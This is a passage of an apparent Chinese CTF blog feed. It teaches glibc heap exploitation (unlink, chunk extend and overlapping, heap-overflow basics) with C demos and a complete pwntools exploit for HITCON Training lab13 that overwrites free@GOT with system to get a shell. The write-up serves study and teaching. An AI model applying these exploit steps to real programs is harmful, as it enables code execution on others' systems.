class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>此时如果再调用 atoi ，其实调用的就是 system 函数。</p><p>From <a href="https://kabeor.github.io/堆溢出-Unlink/">https://kabeor.github.io/堆溢出-Unlink/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Unlink&quot;&gt;&lt;a href=&quot;#堆溢出-Unlink&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Unlink&quot;&gt;&lt;/a&gt;堆溢出-Unlink&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Chunk Extend and Overlapping</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Chunk%20Extend%20and%20Overlapping/"/>
    <id>https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</id>
    <published>2020-01-05T10:00:47.575Z</published>
    <updated>2020-01-05T10:02:08.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Chunk-Extend-and-Overlapping"><a href="#堆溢出-Chunk-Extend-and-Overlapping" class="headerlink" title="堆溢出-Chunk Extend and Overlapping"></a>堆溢出-Chunk Extend and Overlapping</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><p>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><blockquote><p>作用</p></blockquote><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h2><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>当把chunk 1 size改为0x41(0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小)，chunk 2被chunk 1包含进去，，当把chunk1释放时chunk2被一同释放，再申请一个比chunk1大的块就能直接控制chunk2(不要覆盖top chunk)，称为 overlapping chunk。</p><h2 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h2><p>处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。（fastbin 默认的最大的 chunk 可使用范围是 0x70）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1     大小 &gt; fastbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;   <span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin，再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容。</p><h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>首先释放 chunk1 使它进入 unsorted bin 中，然后篡改 chunk1 的 size 域，此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc(0x10)申请的都是fastbin。</p><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h2 id="例-HITCON-Trainging-lab13"><a href="#例-HITCON-Trainging-lab13" class="headerlink" title="例 HITCON Trainging lab13"></a>例 HITCON Trainging lab13</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"          Heap Creator          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Show a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 5. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">( heaparray[v1] )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">    read_input(*(heaparray[v1] + <span class="number">1</span>), *heaparray[v1] + <span class="number">1L</span>L);   <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol><li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li><li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>break *0x400D76</p><p>创建两个大小为0x14的堆块，heap命令查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603290</span><br><span class="line">0x603290:0x00000000000000000x0000000000000021  ===&gt;chunk1</span><br><span class="line">0x6032a0:0x00000000000000140x00000000006032c0  指向</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000021  ===&gt;chunk1数据</span><br><span class="line">0x6032c0:0x61616161616161610x6161616161616161  长度0x14</span><br><span class="line">0x6032d0:0x00000000616161610x0000000000000021  ===&gt;chunk2</span><br><span class="line">0x6032e0:0x00000000000000140x0000000000603300</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000021  ===&gt;chunk2数据</span><br><span class="line">0x603300:0x62626262626262620x6262626262626262  长度0x14</span><br><span class="line">0x603310:0x00000000626262620x0000000000020cf1  ===&gt;top chunk</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>因此堆中保存的结构为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------------------</span><br><span class="line">chunk1 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br><span class="line">chunk2 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure><p>可见如果我们数据的长度为0x18，调用edit_heap就可触发off-by-one覆盖下一堆块的prev_size</p><p>一个chunk在被free掉之后存在bins中，其头部含有prev_size和size，但一旦malloc后，这个prev_size就没用了，它只用来记录前一个空闲块的大小。因此如果malloc0x18个字节的话多出8个字节没有对齐，会将这个prev_size也当做data段的部分分配出去，而不是下一个堆了。</p><p>接下来就是利用<strong>通过 extend 后向 overlapping+fastbin</strong>实现利用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment"># chunk1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment"># chunk3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)<span class="comment"># 0x18,  off-by-one</span></span><br><span class="line">delete(<span class="number">1</span>)             <span class="comment"># 通过 extend 后向 overlapping</span></span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])<span class="comment">#这里的size涉及到后面修改地址时需要多长的字节</span></span><br><span class="line">create(<span class="number">0x70</span>,payload) <span class="comment">#重新创建chunk</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))  <span class="comment"># free_got地址</span></span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]  <span class="comment"># system地址</span></span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># free执行</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cn = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">lib = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(l,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    cn.sendline(str(int(l)))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    <span class="comment">#if index == 2:gdb.attach(cn)</span></span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    gdb.attach(cn)</span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="comment">#leak free addr</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(cn)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)</span><br><span class="line">gdb.attach(cn)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)<span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"><span class="comment">#trim free_got</span></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Chunk-Extend-and-Overlapping&quot;&gt;&lt;a href=&quot;#堆溢出-Chunk-Extend-and-Overlapping&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Chunk Extend and Overlap
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-基本方法</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/"/>
    <id>https://kabeor.github.io/堆溢出-基本方法/</id>
    <published>2020-01-03T12:08:16.574Z</published>
    <updated>2020-01-03T12:08:39.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-基本方法"><a href="#堆溢出-基本方法" class="headerlink" title="堆溢出-基本方法"></a>堆溢出-基本方法</h1><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p><p>堆溢出漏洞发生的基本前提是</p><ul><li>程序向堆上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h2 id="堆溢出的利用策略"><a href="#堆溢出的利用策略" class="headerlink" title="堆溢出的利用策略"></a>堆溢出的利用策略</h2><ol><li>覆盖与其<strong>物理相邻的下一个 chunk</strong>的内容。<ul><li>prev_size</li><li>size，主要有三个比特位，以及该堆块真正的大小。<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ol><h2 id="重要步骤"><a href="#重要步骤" class="headerlink" title="重要步骤"></a>重要步骤</h2><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><ul><li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>计算<strong>开始写入的地址与所要覆盖的地址之间的距离</strong>。 </p><p>一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p><p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长</p><p>用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。</p><p><strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p><p>From <a href="https://kabeor.github.io/堆溢出-基本方法/">https://kabeor.github.io/堆溢出-基本方法/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
